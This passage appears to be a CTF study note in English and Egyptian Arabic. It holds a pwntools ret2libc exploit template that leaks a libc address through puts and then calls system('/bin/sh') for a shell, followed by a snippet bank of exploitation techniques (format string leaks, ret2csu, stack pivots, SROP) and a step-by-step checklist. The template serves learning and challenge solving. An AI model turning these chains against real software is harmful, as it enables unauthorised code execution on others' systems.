log.info(f"pop rdi @ {hex(POP_RDI)}")
log.info(f"ret     @ {hex(RET)}")

# ─── Helper: Connection ──────────────────────────────────────────────────────
def get_io():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BINARY, gdbscript="""
            b *vuln_func
            b *main+???
            c
        """)
    else:
        return process(BINARY)

# ─── Stage 1: Leak libc (if PIE/ASLR) ───────────────────────────────────────
def leak_libc(io):
    """
    Current State : inside main, can overflow buffer
    Desired State : print puts@got → calculate libc base
    Primitive     : control RIP → redirect to puts@plt with puts@got as arg
    """
    padding = b"A" * OFFSET

    # Build leak chain
    chain_leak = flat([
        padding,
        p64(POP_RDI),
        p64(exe.got["puts"]),       # rdi = puts@got
        p64(exe.plt["puts"]),       # call puts → leaks puts address
        p64(exe.sym["main"]),       # return to main for stage 2
    ])

    # ── Interact ──
    io.recvuntil(b"PROMPT: ")       # ← adjust to actual prompt
    io.sendline(chain_leak)

    # ── Parse leak ──
    io.recvline()                   # skip echo if any
    leaked = u64(io.recv(6).ljust(8, b"\x00"))
    log.success(f"Leaked puts @ {hex(leaked)}")

    libc.address = leaked - libc.sym["puts"]
    log.success(f"libc base  @ {hex(libc.address)}")

    return libc.address

# ─── Stage 2: Shell ──────────────────────────────────────────────────────────
def get_shell(io):
    """
    Current State : libc base known, back in main
    Desired State : system("/bin/sh")
    Constraints   : RSP must be 16-byte aligned before call
    """
    padding = b"A" * OFFSET

    system_addr  = libc.sym["system"]
    bin_sh_addr  = next(libc.search(b"/bin/sh\x00"))

    log.info(f"system()   @ {hex(system_addr)}")
    log.info(f"/bin/sh    @ {hex(bin_sh_addr)}")

    chain_shell = flat([
        padding,
        p64(POP_RDI),
        p64(bin_sh_addr),
        p64(RET),               # stack alignment fix
        p64(system_addr),
    ])

    io.recvuntil(b"PROMPT: ")   # ← adjust
    io.sendline(chain_shell)

# ─── Main ─────────────────────────────────────────────────────────────────────
def pwn():
    io = get_io()

    # ── Stage 1: leak ──
    if libc:
        leak_libc(io)
    
    # ── Stage 2: shell ──
    get_shell(io)

    log.success("🐚 Shell obtained!")
    io.interactive()

if __name__ == "__main__":
    pwn()
```

---

### Quick Snippet Bank

```python
# ── Cyclic pattern offset ────────────────────────────────
from pwn import cyclic, cyclic_find
payload = cyclic(300)
# In GDB after crash: x/gx $rsp → value
offset = cyclic_find(0xDEADBEEF)

# ── One gadget ───────────────────────────────────────────
# $ one_gadget libc.so.6
ONE_GADGET = libc.address + 0x????????

# ── Format string leak ───────────────────────────────────
# Find offset: python3 -c "print('%p.'*20)" | ./BINARY
# Then: leaked = int(io.recvuntil(b".")[:-1], 16)

# ── ret2csu (universal gadget for rdx) ───────────────────
# gadget1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# gadget2: mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]

# ── Stack pivot ──────────────────────────────────────────
# leave; ret  →  rsp = rbp; pop rbp
LEAVE_RET = exe.address + 0x????????

# ── SROP skeleton ────────────────────────────────────────
frame = SigreturnFrame()
frame.rip = exe.sym["system"]
frame.rdi = next(exe.search(b"/bin/sh"))
frame.rsp = ???

# ── pwndbg attach shortcut ───────────────────────────────
# In script: context.terminal = ['tmux', 'splitw', '-h']
# io = gdb.debug(BINARY, gdbscript="b *vuln\nc")

# ── libc database ────────────────────────────────────────
# https://libc.blukat.me  /  https://libc.rip
# $ python3 -c "from pwn import *; l=LibcSearcher('puts', 0x????); ..."
```

---

> [!success] ورقة سريعة — استخدمها أثناء أي تحدي
> 
> **ماتفتحش الحل. امشِ بالترتيب ده:**
> 
> 1. أنا بتعامل مع إيه؟
> 2. البرنامج بيعمل إيه؟
> 3. الـ **input** بتاعي بيدخل فين؟
> 4. أنا بإيدي إيه؟
> 5. إيدي وصلت لفين؟
> 6. إيه اللي اتكسر؟
> 7. إيه الـ **primitive**؟
> 8. الـ **primitive** بتديني **capability** إيه؟
> 9. أنا عايز أوصل لأي **state**؟
> 10. إيه الـ **constraints / mitigations**؟
> 11. إيه أصغر **experiment**؟
> 12. إيه الـ **prediction**؟
> 13. إيه اللي حصل فعلًا؟
> 14. هل ده أثبت الفرضية؟
> 15. إيه السؤال الجديد؟

$$\text{Current State} \rightarrow \text{Primitive} \rightarrow \text{Control} \rightarrow \text{Constraints} \rightarrow \text{Desired State} \rightarrow \text{Experiment} \rightarrow \text{Observation} \rightarrow \text{Conclusion} \rightarrow \text{Exploit}$$
